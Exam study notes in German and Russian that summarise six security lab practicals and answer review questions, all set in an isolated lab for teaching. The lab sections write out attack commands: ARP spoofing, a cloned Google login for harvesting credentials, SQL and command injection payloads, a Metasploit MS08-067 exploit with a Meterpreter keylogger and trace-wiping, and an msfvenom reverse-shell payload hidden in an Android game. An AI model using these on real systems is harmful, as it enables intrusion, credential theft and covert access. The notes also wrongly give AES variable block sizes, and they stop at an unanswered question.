# Praktika 01–06 — Zusammenfassung
**Quelle: Praktikumsanleitungen (Schildbach)** · Ergänzt die Theoriekapitel

> **О чём файл.** Краткая, но полная выжимка всех шести лаб: что делали, какими инструментами, какие команды, и — главное для экзамена — **какой теоретический концепт за этим стоит и какое Schutzziel затронуто**. Экзамен может дать практический вопрос («какой инструмент для X», «что делает эта команда», «почему `' OR 1=1 --` логинит без пароля»).
>
> **Среда (из Praktikum 01):** всё в **VirtualBox**, общий **NAT-Netzwerk „eits" = 192.168.42.0/24**, DHCP. VMs: **ForDeb** (атакующий/анализ, Kali-подобная), WebSecurityLab/OWASP, WinXP, GSM (Greenbone), Android. ⚠️ Всё только в изолированной лаборатории, легально, с разрешения.
>
> **Обозначения:** ⭐ вероятно на экзамене · 🔧 команда/инструмент · ⚠️ ловушка · 🔗 связь с главой.

## Обзор — какой практикум к какой теме
| Praktikum | Тема | Теория | Schutzziel |
|---|---|---|---|
| **01** Virtualisierung | Sandboxing, VirtualBox, NAT, Subnetting | [02 Rechnernetze](02_Rechnernetze.md) | — (Testumgebung) |
| **02** MitM + Phishing | ARP-Spoofing, Social Engineering (SET) | [03 → 3.3.3, 3.4.5](03_Angriffe.md) | Vertraulichkeit, Authentizität |
| **03** Websicherheit + Darkweb | SQLi, Command/Directory, XSS, SQLMap, Nikto, TOR | [03 → 3.4](03_Angriffe.md), [04 TOR](04_Anonymitaet_TOR.md) | Vertraulichkeit, Integrität |
| **04** Pentest | nmap → OpenVAS → Metasploit → Meterpreter | [03 → 3.5](03_Angriffe.md) | alle (Übernahme) |
| **05** Android | Trojaner/Backdoor in App (msfvenom, smali) | [05 Malware](05_Malware.md), [03 → 3.5.2](03_Angriffe.md) | alle |
| **06** CrypTool | Caesar, Vigenère, Playfair (klassische Chiffren) | [06 Kryptografie](06_Kryptografie.md) | Vertraulichkeit |

---

## Praktikum 01 — Grundlagen der Virtualisierung (Sandboxing) ⭐

**Ziel:** sichere **Testumgebung** aufbauen — gefährliche Software „gefahrlos ausprobieren" ohne den echten Rechner zu beschädigen. Fachbegriff: **Sandboxing**.

- **Virtualisierung:** mehrere **Gast-Systeme (VMs)** parallel auf einem **Host** → simuliert ein kleines Netz. Software: **VirtualBox** (Oracle, quelloffen, kostenlos, Windows/Linux). Alternativen: QEMU/UTM, VMware.
- **VM-Formate:** fertige **Appliances** (`.ova`/`.ovf`) oder lose Rohdateien (`.vbox`, `.vdi`, `.vmdk`). **Verknüpfter Klon** (nur Änderungen gespeichert, spart Platz) vs. vollständiger Klon.
- ⚠️ **Sicherheitshinweis:** die bereitgestellten VMs enthalten **absichtlich gravierende Sicherheitslücken** → niemals damit im echten Internet surfen.

**Netzwerkmodi in VirtualBox ⭐ (Zuordnung möglich):**
| Modus | Gast↔Gast | Gast→Host | Host→Gast | Gast→Extern | Kerncharakter |
|---|---|---|---|---|---|
| **NAT** (einzeln) | nein | nein | nur per Portweiterleitung | ja | jede VM hinter eigenem NAT |
| **NAT-Netzwerk** ⭐ | **ja** | **nein** (Host geschützt) | nur per Portweiterleitung | **ja** | im Praktikum verwendet |
| Netzwerkbrücke (Bridged) | ja | ja | ja | ja | VM direkt im echten LAN |
| Internes Netzwerk | ja | nein | nein | nein | komplett isoliert |
| Host-only | ja | ja | ja | nein | nur Host + Gäste |

→ Gewählt: **NAT-Netzwerk „eits"** — Gäste reden untereinander, Host bleibt geschützt (kein Gast→Host), Internetzugang möglich. DHCP vergibt Adressen aus **192.168.42.0/24**.

**Subnetting-Wiederholung (Praktikum rechnet es vor) 🧮** (🔗 [02 → 2.6.3](02_Rechnernetze.md)):
```
192.168.42.0/24  → Maske 255.255.255.0
Netzadresse:    192.168.42.0    (Hostteil alles 0)
Broadcast:      192.168.42.255  (Hostteil alles 1)
max. Geräte:    2^8 − 2 = 254
```

---

## Praktikum 02 — Man-in-the-Middle + Phishing ⭐
*(ausführlich in [03 → 3.3.3 und 3.4.5](03_Angriffe.md) — hier Kurzfassung)*

**Teil 1 — MitM per ARP-Spoofing** (3 VMs: Client-Opfer, WebSecurityLab-Server, Angreifer):
1. 🔧 `echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward` — **IP-Forwarding** an (Pakete weiterleiten, damit das Opfer nichts merkt).
2. 🔧 `sudo ip link set enp0s3 promisc on` — **promiscuous mode**.
3. 🔧 `sudo arpspoof -i enp0s3 -r -t ClientIP ServerIP` — `-r` beidseitig, `-t` Target.
4. Analyse: **urlsnarf** (URLs), **driftnet** (Bilder), **Wireshark** (`-k`).
- 🔧 **Erkennung:** `ip neighbour show` / `ip n` → **zwei IPs mit gleicher MAC** = Spoofing-Indiz; Wireshark-Expertinfo „duplicate use … detected".
- **Schutzziele:** Vertraulichkeit (Mitlesen) stark betroffen; Integrität/Verfügbarkeit nur, wenn der Angreifer Pakete verändert/verwirft.
- ⚠️ Nur **unverschlüsselter** Verkehr lesbar; HTTPS schützt den Inhalt.

**Teil 2 — Phishing mit SET (Social Engineering Toolkit):**
- 🔧 `sudo setoolkit` → *Social-Engineering Attacks → Website Attack Vectors → **Credential Harvester** → Web Templates (Google)*.
- Klont die Google-Login-Seite, sammelt eingegebene (Test-)Daten → Report in `/root/.set/reports/`.
- **Domain-Aufbau verstehen** (wichtig gegen Phishing): Besitzer = **Domain + TLD** (`google.de`); Subdomain/Pfad/Parameter nur Zusätze. Tricks: `goog1e.de`, `google.sicherer-login.de` (echte Domain = sicherer-login.de).
- **Erweiterung:** mit **DNS-Spoofing** zeigt die Adresszeile sogar die echte Domain → noch glaubwürdiger.

---

## Praktikum 03 — Websicherheit + Dark Web ⭐⭐

### Teil 1 — Websicherheit (OWASP-BWA = Broken Web Applications)
Trainingsserver mit absichtlichen Lücken; Angriffsziel aus ForDeb-VM. Kennen: **OWASP Top 10**.

**1.1 SQL-Injection (Mutillidae II) ⭐⭐ — der wichtigste Praktikums-Fakt:**
- Eingabe `'` (Hochkomma) im Nutzernamen → **Fehlermeldung verrät die SQL-Abfrage**: `SELECT username FROM accounts WHERE username='?' …`
- Eingabe **`' OR 1=1 -- -`** als Nutzername → Abfrage wird zu
  `SELECT username FROM accounts WHERE username='' OR 1=1; -- -' …`
  → **`1=1` ist immer wahr (Tautologie)**, `-- -` kommentiert den Rest (inkl. Passwortprüfung) aus → **Login als `admin` ohne Passwort**.
- **Warum es klappt:** Nutzereingabe wird **ungeprüft** in den Query-String eingesetzt → Eingabe wird als **SQL-Code** statt als Daten interpretiert.
- **Gegenmaßnahme:** **Prepared Statements**, Eingabevalidierung, Encodings (🔗 [03 → 3.4.3](03_Angriffe.md)).

**1.2 Command Injection (DNS-Lookup-Tool):**
- Server ruft intern `nslookup <Eingabe>` auf, Eingabe **ungeprüft** → `localhost && ls -la` führt **beliebiges OS-Kommando** aus (Befehlsverkettung mit `&&`).

**1.3 Directory Traversal / unsichere Objektreferenz:**
- URL `…/index.php?page=dns-lookup.php` → Parameter `page` ungeprüft → `…?page=/etc/passwd` zeigt **Systemdatei**; `…/mutillidae/images` listet Verzeichnis (Directory Listing).
- Ursachen: fehlende Parameterprüfung + **zu weite Rechte des Webservers**.

**1.4 Stored XSS (DVWA, Gästebuch) ⭐:**
- Nachricht `Test <script>alert("Hallo");</script>` → bei **jedem** Seitenaufruf aller Nutzer ausgeführt (**stored/persistent XSS**).
- Längenlimit `maxlength="50"` ist nur **im Browser** gesetzt → über Entwickler-Werkzeuge entfernbar → größere Skripte (Links umbiegen, Überschrift ändern, bis Session-Diebstahl).
- Ursache: **ungeprüfte Eingaben** + nur clientseitige Prüfung. Gegenmaßnahme: Output-Encoding, serverseitige Validierung (🔗 [03 → 3.4.4](03_Angriffe.md)).

**1.5 SQLMap (OWASP Bricks):** 🔧 automatisiertes SQLi-Tool.
- `sqlmap -u <URL>` → erkennt DBMS; `--dbs` listet Datenbanken; Zugriff auf DB `bricks` → Tabelle `users` mit Passwörtern. Einige im **Klartext** (sehr schlecht!), eines als **MD5-Hash** `5f4dcc3b5aa765d61d8327deb882cf99` — per **Wörterbuchangriff** sofort geknackt = **„password"** (🔗 MD5 unsicher, [06 → 6.6](06_Kryptografie.md)).

**1.6 Nikto:** 🔧 kompakter Webserver-Schwachstellenscanner.
- `nikto -host http://<URL> -C all -output nikto.txt` → findet veraltete Komponenten, bekannte Lücken mit **CVE/OSVDB**-Kennung, Directory Listing, XSS. Kann IDS umgehen. ⚠️ Zu häufige Scans → IP als „Bot" markiert.

### Teil 2 — Dark Web (TOR-Browser) ⭐ (🔗 [04 TOR](04_Anonymitaet_TOR.md))
- **TOR-Browser** = modifizierter Firefox; nutzt **Onion-Routing**, dynamische Route über weltweit verteilte Knoten → trennt **Identität (IP)** von **Inhalt (Datenpakete)**.
- **Nachteile (Praktikum):** Überwachung vieler Knoten kann Kommunikation aufdecken; kein Schutz, wenn jemand **ersten und letzten** Knoten kontrolliert; langsam.
- **Eigene Verantwortung:** nur TOR reicht nicht — englische Version nutzen, Fenstergröße/**Letterboxing** nicht ändern (sonst Browser-Fingerprinting).

**Terminologie ⭐⭐ (klassische Zuordnungsfrage):**
| Begriff | Bedeutung |
|---|---|
| **Internet** | infrastrukturelle Grundlage (Hardware + Protokolle) |
| **Darknet** | mit Zusatz-Hardware/Protokollen realisiertes Netz **auf** dem Internet (TOR ist **ein** Darknet von vielen) |
| **World Wide Web** | alle erreichbaren Inhalte des Internets |
| **Surface Web** (Clear/Visible Web) | **frei zugänglich, von Suchmaschinen indexiert** (z. B. Wikipedia) — kleinster Teil |
| **Deep Web** | **nicht** von Suchmaschinen indexiert, Zugang über Login/Passwort (Onlinebanking, E-Mail, privates Instagram) — **größter Teil** |
| **Dark Web** | Dienste/Seiten, erreichbar **nur über ein Darknet** + spezielle Software (TOR-Browser), `.onion` |

⚠️ **Unterscheiden:** **Darknet** = Infrastruktur (das Netz), **Dark Web** = Inhalte darauf. **Deep Web ≠ Dark Web** (Deep Web = alles nicht-indexierte inkl. Onlinebanking; Dark Web = kleiner, verborgener Teil davon).

---

## Praktikum 04 — Penetrationstest ⭐
*(ausführlich in [03 → 3.5](03_Angriffe.md) — hier die Kette)*

Ziel: veraltetes **WinXP** übernehmen. VMs: ForDeb (Angreifer), GSM (Scanner), WinXP (Opfer).
1. **Recon/Portscan** 🔧 `nmap`/**Zenmap**: `ip a` (eigenes Netz), Ping-Scan (Host Discovery), **Intense Scan `nmap -T4 -A -v <netz>/24`** (`-A` = OS- + Versions-Erkennung + Skript + Traceroute; braucht sudo). → WinXP mit **SMB auf Port 445**, Workgroup aus `smb-os-discovery`.
2. **Schwachstellenanalyse** 🔧 **Greenbone/OpenVAS** (GSA-Weboberfläche, selbstsigniertes Zertifikat zulassen, Login admin/admin, Aufgaben-Wizard, Ziel = WinXP). Findet kritische **SMB-Lücke (netapi)**.
3. **Exploit** 🔧 **Metasploit** (`msfconsole -q`): `search type:exploit platform:windows smb` → `use exploit/windows/smb/ms08_067_netapi`; `show options`/`show missing` → `set RHOST <WinXP>`, LHOST = ForDeb, RPORT 445, `set TARGET …`; Payload **`windows/meterpreter/reverse_tcp`**; `exploit`/`run`.
   - ⚠️ **MS06-040** verursacht auf XP SP2 nur **DoS (Absturz)**; der neuere **MS08-067** übernimmt → Wahl des richtigen Exploits entscheidend.
4. **Post-Exploitation (Loot)** 🔧 Meterpreter: `getuid`, `getsystem` (**Rechte-Eskalation**), `sysinfo`, `screenshot`, `ps`/`migrate PID` (nach `explorer.exe`), `keyscan_start/dump/stop`, `shell`, `shutdown -s -f -t 0`, `timestomp` (Spuren verwischen).
- **Exploit vs. Payload ⭐:** Exploit nutzt die Lücke/verschafft Zugriff; **Payload** ist der danach ausgeführte Schadcode (hier die Meterpreter-Session).

---

## Praktikum 05 — Android-Trojaner (Backdoor in App) ⭐

**Ziel:** eine **Hintertür (Backdoor)** in eine echte App einschleusen → **trojanisierte App** (🔗 [05 Malware → Trojaner/Backdoor](05_Malware.md)). VMs: ForDeb (Angreifer), Android 4.3 (Opfer).

> ⚠️ **Nicht wie Praktikum 04:** hier wird **keine Schwachstelle ausgenutzt**, sondern Schadcode in eine harmlose App (Spiel „2048") versteckt — klassischer **Trojaner** (Täuschung, Nutzer startet selbst).

**Ablauf (5 Schritte, Abb. 1):** *Payload erzeugen → Payload in App injizieren → App signieren → App ausliefern → Exploit.*
1. 🔧 **Payload erzeugen:** `msfvenom -o payload.apk -p android/meterpreter/reverse_tcp LHOST=<ForDebIP> LPORT=4334`
   - **reverse_tcp:** die App verbindet sich **vom Opfer zum Angreifer** → man muss die (veränderliche) IP des Smartphones nicht kennen. Gegenstück **bind_tcp** (öffnet Port auf dem Opfer, Angreifer verbindet sich hin — auch andere könnten das).
2. 🔧 **Dekompilieren:** `apktool d -f -o 2048 2048.apk` und `apktool d -f -o payload payload.apk`
   - APK → lesbare Bestandteile. Android-Apps werden in Java/Kotlin geschrieben → zu **Dalvik Executables (`.dex`)** kompiliert → mit apktool in **Smali** (eine Art **Assembler** für Android) umwandelbar. Smali ändern = Programmfluss ändern.
3. **Injizieren:** `smali`-Verzeichnis der Payload-App in die 2048-App kopieren → Code ist drin, läuft aber noch nicht.
4. **Hook:** im Einstiegspunkt der App (`<activity>` mit `MAIN`/`LAUNCHER` in **AndroidManifest.xml**) den Payload-Start **mit dem App-Start verknüpfen** (**Hooking**).
5. **Signieren + Ausliefern + Exploit:** App neu signieren, verteilen; beim Start der App baut sie die Reverse-Verbindung zum Angreifer auf → Meterpreter-Session.

**Kernbegriffe ⭐:** Backdoor, trojanisierte App, Dekompilieren, Smali/Dalvik/`.dex`, Hooking, Reverse- vs. Bind-Shell, APK signieren.

---

## Praktikum 06 — Kryptographische Verfahren (CrypTool 2) ⭐

**Ziel:** klassische Chiffren verstehen und brechen. **CrypTool 2** (Windows, .NET) — visuelle Programmierung (Komponenten per Drag&Drop verbinden: Texteingabe → Chiffre → Textausgabe; F5 = Start). 🔗 [06 Kryptografie](06_Kryptografie.md).

> Klassische Verfahren werden heute nicht mehr eingesetzt, aber ihre Techniken (**Substitution, Rotation, Transposition**) bilden die Basis moderner Chiffren.

### 1. Caesar-Chiffre — monoalphabetische Substitution ⭐🧮
- Jeder Buchstabe um **Schlüssel k** Stellen verschoben (z. B. k=3: A→D, B→E …).
- **Schlüsselraum:** = Alphabetlänge; bei A–Z nur **25 sinnvolle Schlüssel** (26. bildet A→A ab).
- **Kryptoanalyse (Ciphertext-Only):** (1) **Brute-Force** — alle 25 testen; (2) **Häufigkeitsanalyse** — da jeder Klartextbuchstabe **immer** auf denselben Geheimtextbuchstaben abgebildet wird, verrät die statistische Buchstabenverteilung die Verschiebung. CrypTool: *Frequency Test → Caesar-Analyse → Caesar (entschlüsseln)* — Sprache = Deutsch beachten!
- 🧮 **Beispiel-Lösung aus dem Praktikum** (Geheimtext `HLQHQULQJVLH…`, k=3) → *„EINEN RING SIE ZU KNECHTEN, SIE ALLE ZU FINDEN, INS DUNKEL ZU TREIBEN UND EWIG ZU BINDEN …"* (Herr der Ringe). ⭐ Gut als Rechenbeispiel: Entschlüsseln = jeden Buchstaben um k **zurück** schieben.

### 2. Vigenère-Chiffre — polyalphabetische Substitution ⭐
- Statt einer Zahl ein **Schlüsselwort** (z. B. `KEY`), das sich über den Klartext wiederholt. Jeder Klartextbuchstabe wird per **Caesar mit dem jeweiligen Schlüsselbuchstaben** verschoben.
  ```
  Klartext:   DAS IST EIN GEHEIMER TEXT
  Schlüssel:  KEY KEY KEY KEYKEYKE YKEY
  Geheimtext: NEQ SWR OML QIFOMKOV ROBR
  ```
- Da **wechselnde Alphabete** benutzt werden, wird ein Klartextbuchstabe **nicht** immer gleich chiffriert → **einfache Häufigkeitsanalyse scheitert**. Galt lange als unknackbar (bis ~1850).
- **Sicherheit hängt an der Schlüssellänge:** Schlüssel der Länge 1 = Caesar; je länger/zufälliger, desto sicherer (Grenzfall = One-Time-Pad, 🔗 [06 → 6.3](06_Kryptografie.md)).
- **Kryptoanalyse:** erst **Schlüssellänge** bestimmen (➕ Kasiski/Friedman), dann je Position eine Häufigkeitsanalyse. ⚠️ Im Praktikum scheitert die Analyse bei zu kurzem Text.

### 3. Playfair-Chiffre — bigraphische Substitution
- Verschlüsselt **Buchstabenpaare** (nicht einzelne Buchstaben) über eine **5×5-Schlüsselmatrix**.
- Matrix aus Schlüsselwort bilden: doppelte Buchstaben entfernen (`KRYPTOGRAPHIE` → `KRYPTOGAHIE`), Rest des Alphabets anhängen (I/J teilen sich ein Feld). Britisches Militär bis Ende 1. Weltkrieg.

**Einordnung der Verfahren ⭐ (Zuordnung):**
| Chiffre | Typ | Einheit | Schlüssel |
|---|---|---|---|
| **Caesar** | monoalphabetische Substitution | 1 Buchstabe | eine Verschiebezahl |
| **Vigenère** | polyalphabetische Substitution | 1 Buchstabe, wechselnde Alphabete | Schlüsselwort |
| **Playfair** | bigraphische Substitution | Buchstabenpaare | Schlüsselwort → 5×5-Matrix |

---

# ❓ Fragen aus den Anleitungen (direkt aus den Praktikums-PDFs)
> Это вопросы, которые Schildbach **прямо задаёт в тексте лаб** («Können Sie erklären…?», «Warum…?»), плюс явные Lernziele из разделов Fazit. Их проще всего перенести в экзамен. Ответы на уровне понимания/защиты — на экзамене спрашивают концепт и Gegenmaßnahme, а не инструкцию по взлому.

### Praktikum 01 — Virtualisierung
**P1.1 ⭐ Warum ein NAT-Netzwerk und nicht Netzwerkbrücke / internes Netz?**
> **✅** Anforderungen: Gäste reden **untereinander** (Gast↔Gast), der **Host bleibt geschützt** (kein Gast→Host, damit Experimente ihn nicht kompromittieren), Gäste haben bei Bedarf **Internet**. Nur das **NAT-Netzwerk** erfüllt alle drei. Netzwerkbrücke hängt die VMs direkt ins echte LAN (gefährlich), internes Netz hat kein Internet, einfaches NAT keine Gast↔Gast-Kommunikation.

**P1.2 🧮 Wie viele Geräte passen in 192.168.42.0/24?**
> **✅** 2⁸ − 2 = **254** (ohne Netz-/Broadcast-Adresse); im VirtualBox-NAT-Netz zusätzlich .1 (Gateway), .2 (Host-Loopback), .3 (DHCP) reserviert → **251**.

**P1.3 🧮 Können 192.168.42.37/26 und .70/26 ohne Router kommunizieren?**
> **✅** Nein. /26 → Maske 255.255.255.192, Blöcke à 64. 37 → Netz **.0/26**, 70 → Netz **.64/26** → verschiedene Subnetze → Router nötig.

**P1.4 ⭐ Wozu dient ein Snapshot, was ist der Nachteil beim Zurücksetzen?**
> **✅** Speichert den VM-Zustand; nach Fehlern zurücksetzbar, ohne die VM neu zu importieren. Nachteil: **alle Änderungen seit dem Snapshot** (Dateien, Updates, Konfiguration) gehen verloren.

**P1.5 Wie interpretieren Sie `10 transmitted, 0 received, 100% packet loss`?**
> **✅** Kein ICMP-Echo beantwortet → Ziel nicht erreichbar: falsche IP, VM aus, falscher Netzmodus/anderes Subnetz oder ICMP gefiltert.

### Praktikum 02 — MitM + Phishing
**P2.1 ⭐⭐ (Aufgabe 2.15) Kann man am ARP-Cache allein Angreifer und Opfer erkennen? Hilft das ARP-Monitoring?**
> **✅** Am Cache allein nur eingeschränkt: man sieht, dass **zwei IPs dieselbe MAC** haben → Spoofing läuft; diese MAC gehört meist dem **Angreifer**. Welche IP „echt" zu dieser MAC gehört, verrät der Cache nicht eindeutig. Das **ARP-Monitoring** (`ip monitor neigh`) zeigt den **Verlauf**: die Server-IP wechselt plötzlich auf eine MAC, die schon einer anderen IP gehört → daraus lässt sich die Angreifer-IP ableiten. Sicher klappt es erst mit einer Referenz der echten MACs (voriger Cache-Stand, statische Einträge, Wireshark-Expertinfo).

**P2.2 ⭐ Warum muss IP-Forwarding aktiviert sein?**
> **✅** Sonst verwirft der Angreifer die umgeleiteten Pakete → Verbindung bricht ab (DoS), Angriff fällt auf. Mit Forwarding leitet er sie ans echte Ziel weiter → das Opfer kommuniziert **unauffällig** normal, während er mitliest.

**P2.3 Wozu der promiskuitive Modus?**
> **✅** Normal verarbeitet die Netzkarte nur Pakete an die **eigene** MAC (+ Broadcast). Promisc verarbeitet **alle** ankommenden Pakete → nötig zum Sniffing fremden Verkehrs.

**P2.4 ⭐ Welche Schutzziele verletzt der MitM-Angriff? Wann wären weitere betroffen?**
> **✅** **Vertraulichkeit** stark (unberechtigtes Mitlesen). **Integrität** und **Verfügbarkeit** im Szenario **nicht** (nichts verändert/blockiert). Integrität wäre verletzt, wenn Pakete manipuliert werden (Bilder → Werbung); Verfügbarkeit, wenn Pakete verworfen/Zugriff unterbunden wird.

**P2.5 ⭐⭐ Wem gehört `google.sicherer-login.de`? Ist HTTPS ein Vertrauensnachweis?**
> **✅** Besitzer = nur **Domain + TLD** = **sicherer-login.de**; „google" ist nur frei wählbare Subdomain (Täuschung). **HTTPS ist kein Vertrauensnachweis** — es zeigt nur Verschlüsselung, nicht den Besitzer; auch Phishing-Seiten haben Zertifikate.

**P2.6 Warum funktioniert ARP-Spoofing nur im lokalen Netz?**
> **✅** ARP arbeitet auf **Schicht 2** innerhalb eines **Subnetzes**; ARP-Pakete werden nicht geroutet, über Grenzen geht es nur übers Gateway. Für MitM über Netzgrenzen braucht man andere Techniken (DNS-Spoofing, kompromittierter Router).

### Praktikum 03 — Websicherheit + Dark Web
**P3.1 ⭐⭐ Warum loggt `' or 1=1; -- -` als Nutzername ohne Passwort ein?**
> **✅** Eingabe wird **ungeprüft** in `… WHERE username='<Eingabe>' …` eingesetzt → `… WHERE username='' OR 1=1; -- -'`. `OR 1=1` immer wahr (**Tautologie**), `-- -` kommentiert die Passwortprüfung aus → erste Zeile (admin) wird zurückgegeben. Schutz: **Prepared Statements**/parametrisierte Abfragen, Validierung.

**P3.2 ⭐ Warum schützt `maxlength="50"` nicht vor XSS? Betroffene Schutzziele?**
> **✅** Die Grenze steht nur im HTML, **clientseitig** → mit Entwicklerwerkzeugen entfernbar oder per direkter Anfrage umgehbar. Nötig: **serverseitige** Validierung + **Output-Encoding**. Betroffen: **Integrität** der Seite, je nach Skript **Vertraulichkeit** (Session-Diebstahl).

**P3.3 Was zeigt der sqlmap-Fund `5f4dcc…cf99 (password)`?**
> **✅** Passwort als **MD5-Hash** gespeichert (besser als Klartext), aber MD5 ist **schnell und ungesalzen** und „password" ein häufiges Wort → **Wörterbuchangriff** findet es sofort. Richtig: **Salt** + langsame Passwort-Hashfunktion + starke Passwörter.

**P3.4 ⭐⭐ Grenzen Sie Surface/Deep/Dark Web und Darknet ab.**
> **✅** **Internet/Darknet** = Infrastruktur, **Surface/Deep/Dark Web** = Inhalte. **Surface Web**: indexiert, frei (kleinster Teil). **Deep Web**: nicht indexiert, hinter Login (größter Teil, z. B. Onlinebanking). **Dark Web**: im Darknet, braucht spezielle Software (Tor, `.onion`). **Darknet** = das Netz, **Dark Web** = die Inhalte darauf.

**P3.5 Warum ist Onion over VPN sinnvoll?**
> **✅** Allein hat jede Technik eine Lücke: der VPN-Server kennt Quelle+Ziel+Inhalt; bei Tor sieht der Eintrittsknoten die echte IP. Bei **VPN→Tor** sieht der Guard nur die VPN-IP, der VPN-Anbieter nur, dass Tor genutzt wird (nicht Ziel/Inhalt). Preis: geringerer Durchsatz.

**P3.6 Nennen Sie je zwei Vor- und Nachteile von Tor.**
> **✅** Vorteile: dynamische Route über weltweite Knoten (schwer nachzuverfolgen); Trennung Identität (IP) ↔ Inhalt; schwer staatlich zu zwingen (kein zentraler Betreiber). Nachteile: wer genug Knoten überwacht, deckt Verkehr auf; kein Schutz, wenn ersten+letzten Knoten eine Partei kontrolliert; niedriger Durchsatz.

### Praktikum 04 — Penetrationstest (Fazit = Lernziele ⭐⭐)
**P4.1 ⭐⭐ Was ist ein Portscanner und wie arbeitet er grob?**
> **✅** Werkzeug der **Informationsbeschaffung** (z. B. nmap). Schickt an viele Ports Anfragen und wertet die Antwort aus: **SYN/ACK** → offen, **RST** → geschlossen, keine Antwort → **gefiltert** (Firewall). Aus offenen Ports schließt man auf **Dienste** (445→SMB), mit Zusatzoptionen auf **Version/OS**. So findet man mögliche Angriffspunkte.

**P4.2 ⭐⭐ Unterschied Exploit vs. Payload?**
> **✅** Der **Exploit** nutzt eine **konkrete Schwachstelle** aus, um **Zugriff** zu bekommen (allein kein weiterer Schaden). Der **Payload** ist der danach ausgeführte **Schadcode** (hier eine Fernsteuer-Session). Bild: Exploit = Tür öffnen, Payload = was drinnen passiert.

**P4.3 ⭐ Nennen und beschreiben Sie die Phasen eines gezielten Angriffs.**
> **✅** (1) **Reconnaissance** (wichtigster Schritt): Hosts/Ports/OS scannen, Schwachstellen suchen. (2) **Exploit**: Lücke ausnutzen, eindringen. (3) **Zugangssicherung/Ausbreitung**. (4) **Loot**: Informationen sammeln. (5) **Spuren verschleiern**. Im Praktikum: nmap → Greenbone → Metasploit (ms08_067_netapi) → Meterpreter.

**P4.4 Warum klassifizierte nmap bei einigen Hosts kein OS?**
> **✅** OS-Fingerprinting braucht **mind. einen offenen und einen geschlossenen Port** und eindeutige Antwortmuster. Gründe für „unbekannt": keine/zu wenige offene Ports (virtuelle NAT-Infrastruktur), **Firewall filtert**, kein passendes Muster, oder nmap lief **ohne sudo** (OS-Erkennung nur mit Rechten).

**P4.5 Portscanner vs. Schwachstellenscanner?**
> **✅** Der **Portscanner** findet offene Ports und vermutete Dienste. Der **Schwachstellenscanner** (OpenVAS/GSM) prüft zusätzlich auf **bekannte Schwachstellen** (NVT/CVE-Datenbank) und Konfigurationsfehler mit Hinweisen — mächtiger, aber **invasiver** → kann ein **IDS** alarmieren.

### Praktikum 05 — Android-Trojaner (Fazit = „Moral" ⭐)
**P5.1 ⭐ Unterschied zu Praktikum 04: wird hier eine Schwachstelle ausgenutzt?**
> **✅** Nein. In P04 wird eine **Schwachstelle** ausgenutzt (Exploit). Hier wird Schadcode in eine harmlose App (Spiel „2048") **versteckt** und der Nutzer startet sie selbst → klassischer **Trojaner** (Täuschung), mit dauerhaftem Zugang = **Backdoor**.

**P5.2 ⭐ Reverse- vs. Bind-Verbindung — welche und warum?**
> **✅** **reverse_tcp**: das **Opfer verbindet sich zum Angreifer**. Vorteil: man muss die (veränderliche, oft hinter NAT liegende) IP des Smartphones nicht kennen, und Firewalls, die nur **eingehende** Verbindungen blocken, werden umgangen. **bind** öffnet einen Port auf dem Opfer, zu dem der Angreifer (und potenziell Dritte) sich verbinden — eingehend oft geblockt.

**P5.3 Warum ist eine App-Signatur nötig, aber kein echter Vertrauensnachweis?**
> **✅** Android verlangt eine **digitale Signatur**, um Autor zuzuordnen und die App vor **Manipulation** zu schützen (Integrität). Sie muss aber **nicht** von einer Autorität bestätigt werden — ein **selbst erzeugtes** Zertifikat genügt. Darum belegt eine Signatur allein **nicht**, dass die App vertrauenswürdig ist.

**P5.4 ⭐ „Moral von der Geschichte" (Fazit): wie schützt man sich?**
> **✅** Nur ~33 % der Virenscanner erkannten den einfachen Trojaner. Schutz liegt v. a. beim Nutzer: Apps nur aus **vertrauenswürdigen Quellen** installieren und die **angeforderten Berechtigungen** kritisch prüfen (ein Spiel braucht keine SMS-/Kontakt-/Standort-Rechte).

### Praktikum 06 — Kryptographie (CrypTool)
**P6.1 ⭐ Kryptografie, Kryptoanalyse, Kryptologie?**
> **✅** **Kryptografie** = Verfahren zum **Verschlüsseln** entwerfen/beschreiben. **Kryptoanalyse** = Methoden zum **Brechen** solcher Verfahren. **Kryptologie** = Oberbegriff für beides (Teil der Informationssicherheit).

**P6.2 ⭐⭐ Warum ist Caesar trivial zu brechen, Vigenère aber nicht mit einfacher Häufigkeitsanalyse?**
> **✅** Caesar ist **monoalphabetisch** — jeder Klartextbuchstabe wird **immer gleich** abgebildet → Buchstabenhäufigkeit verrät die Verschiebung, außerdem nur **25 Schlüssel** (Brute-Force). Vigenère ist **polyalphabetisch** — das wiederholte Schlüsselwort chiffriert denselben Buchstaben je nach Position **unterschiedlich** → die Häufigkeit verwischt. Man muss erst die **Schlüssellänge** bestimmen (➕ Kasiski/Friedman), dann je Position eine Häufigkeitsanalyse.

**P6.3 ⭐ Wovon hängt die Sicherheit von Vigenère ab?**
> **✅** Von der **Schlüssellänge**: Länge 1 = Caesar; je länger/zufälliger der Schlüssel, desto sicherer. Grenzfall = Schlüssel so lang wie der Text und zufällig → **One-Time-Pad** (🔗 [06 → 6.3](06_Kryptografie.md)).

**P6.4 ⭐⭐ ECB vs. CBC — warum bleibt ein Bild im ECB-Modus erkennbar?**
> **✅** **ECB** verschlüsselt jeden Block **unabhängig** → **gleiche Klartextblöcke ergeben gleiche Chiffreblöcke**, also bleiben Strukturen/Muster des Bildes sichtbar. **CBC** verknüpft jeden Klartextblock per **XOR mit dem vorigen Chiffreblock** → gleiche Inhalte ergeben verschiedene Chiffreblöcke → Muster verschwinden. Darum ist der Verkettungsmodus für die Sicherheit entscheidend.

**P6.5 Warum ist DES unsicher, und was ist die Lösung?**
> **✅** DES hat nur **56 Bit** Schlüssel → per **Brute-Force** angreifbar. Lösung: mehrfache Anwendung, v. a. **3DES (Triple-DES)** mit effektiv größerer Schlüssellänge; moderner Nachfolger ist **AES**.

**P6.6 ⭐ Grundeigenschaften von AES?**
> **✅** Symmetrische **Blockchiffre** (Rijndael-Algorithmus), Blockgröße 128/192/256 Bit, Schlüssellänge **128/192/256 Bit**; Runden mit Substitution, Zeilenverschiebung, Spaltenmischung, Rundenschlüssel-XOR. Gilt als sehr sicher, eingesetzt in **TLS, IPSec, 802.11i, SSH**.

**P6.7 Was braucht ein Known-Plaintext-Angriff (CBC-Beispiel)?**
